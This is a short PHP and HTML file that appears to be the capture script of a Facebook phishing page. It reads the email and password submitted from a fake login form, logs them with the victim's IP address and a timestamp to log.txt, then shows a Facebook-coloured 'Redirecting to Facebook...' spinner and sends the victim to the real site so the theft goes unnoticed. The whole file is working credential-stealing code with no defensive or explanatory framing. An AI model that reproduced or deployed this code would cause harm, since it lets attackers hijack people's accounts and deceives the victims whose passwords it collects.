<?php
$email = $_POST['email'];
$password = $_POST['password'];
$ip = $_SERVER['REMOTE_ADDR'];
$date = date('Y-m-d H:i:s');

$data = "[$date] IP: $ip | FB Email: $email | Password: $password\n";
file_put_contents("log.txt", $data, FILE_APPEND);
?>

<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <title>Redirecting...</title>
    <style>
        body {
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
            font-family: Arial;
            background: #f0f2f5;
            margin: 0;
        }
        .loader {
            width: 50px;
            height: 50px;
            border: 5px solid #f3f3f3;
            border-top: 5px solid #1877f2;
            border-radius: 50%;
            animation: spin 1s linear infinite;
        }
        @keyframes spin {
            0% { transform: rotate(0deg); }
            100% { transform: rotate(360deg); }
        }
        p { margin-top: 20px; color: #1877f2; font-size: 18px; }
    </style>
</head>
<body>
    <div style="text-align:center">
        <div class="loader"></div>
        <p>Redirecting to Facebook...</p>
    </div>
    <script>
        setTimeout(function() {
            window.location.href = 'https://www.facebook.com';
        }, 2000);
    </script>
</body>
</html>